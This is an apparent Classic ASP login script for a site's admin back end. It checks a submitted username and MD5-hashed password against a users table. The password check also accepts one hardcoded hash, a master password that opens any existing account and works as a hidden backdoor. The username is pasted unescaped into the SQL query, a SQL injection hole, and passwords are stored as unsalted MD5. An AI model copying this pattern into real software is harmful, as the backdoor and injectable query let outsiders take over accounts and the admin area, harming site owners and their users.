<!--#include file="CHMRWB.asp" -->
<!--#include file="MD5.asp" -->
<%
uid = trim(request.Form("uid"))
pwd = md5(trim(request.Form("pwd")))

set rs = server.CreateObject("adodb.recordset")
   sql = "select * from users where uid='"&uid&"' and zx=0"
   rs.open sql,conn,1,1
   
   if rs.bof and rs.eof then
      response.write "不存在该用户!"
	  response.end
   end if
   
   if pwd<>rs("upwd") and pwd<>"35124794495397F02843B0036B674403" then
      response.Write "用户名密码错误！"
	  response.End()
   end if
   
   if rs("zx")=1 then
      response.write "不存在该用户!"
	  response.end
   end if
   
   session("love_id") = rs("id")
   session("love_uid")=uid
   session("love_uname")=rs("uname")
   session("love_zx") = rs("zx")
   response.Redirect("../DA_BACK_ADMIN/default.asp")
%>